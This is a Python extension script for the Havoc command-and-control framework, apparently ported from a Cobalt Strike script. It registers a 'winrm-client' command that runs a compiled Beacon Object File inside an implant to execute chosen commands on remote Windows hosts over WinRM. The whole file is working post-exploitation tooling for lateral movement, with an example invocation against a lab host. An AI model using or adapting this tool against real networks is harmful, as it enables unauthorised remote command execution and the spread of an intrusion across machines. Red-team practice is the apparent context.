#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BOF WinRM Client for Havoc C2
Based on the Cobalt Strike CNA script (bof-winrm-client.cna)

This script registers a winrm-client command that uses WinRM to execute
commands on remote systems via a Beacon Object File (BOF).
"""

import havoc
from os.path import exists, join, dirname, abspath
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-16le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size += calcsize(fmt)

try:
    BOF_PATH = join(dirname(abspath(__file__)), "bof.x64.o")
except NameError:
    BOF_PATH = "bof.x64.o"


def winrm_client_callback(demonID, *args):
    """
    Callback function for the winrm-client command.
    
    Usage: winrm-client --host <hostname> --cmd <command>
    
    Options:
        --host      <hostname>  Name or IP of the target
        --cmd       <command>   Command to execute on the remote host
    """
    demon = havoc.Demon(demonID)
    
    host = None
    cmd = None
    
    args_list = list(args)
    i = 0
    while i < len(args_list):
        if args_list[i] == "--host":
            i += 1
            if i >= len(args_list):
                demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing --host value")
                return
            host = args_list[i]
        elif args_list[i] == "--cmd":
            i += 1
            if i >= len(args_list):
                demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing --cmd value")
                return
            cmd = args_list[i]
        i += 1
    
    if host is None:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "need to pass --host")
        return
    
    if cmd is None:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "need to pass --cmd")
        return
    
    if not exists(BOF_PATH):
        demon.ConsoleWrite(
            demon.CONSOLE_ERROR, 
            f"BOF file not found: {BOF_PATH}\n"
            "Make sure to compile the BOF first."
        )
        return
    
    packer = Packer()
    packer.addWstr(host)
    packer.addWstr(cmd)
    
    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK, 
        f"Executing WinRM command on {host}: {cmd}"
    )
    
    demon.InlineExecute(TaskID, "go", BOF_PATH, packer.getbuffer(), False)

    return TaskID


def register():
    """Register the winrm-client command with Havoc."""
    havoc.RegisterCommand(
        winrm_client_callback,
        "",
        "winrm-client",
        "Use WinRM to execute commands on other systems",
        0,
        "winrm-client --host <hostname> --cmd <command>",
        "winrm-client --host ws.mini.lab --cmd \"whoami /all\""
    )

register()
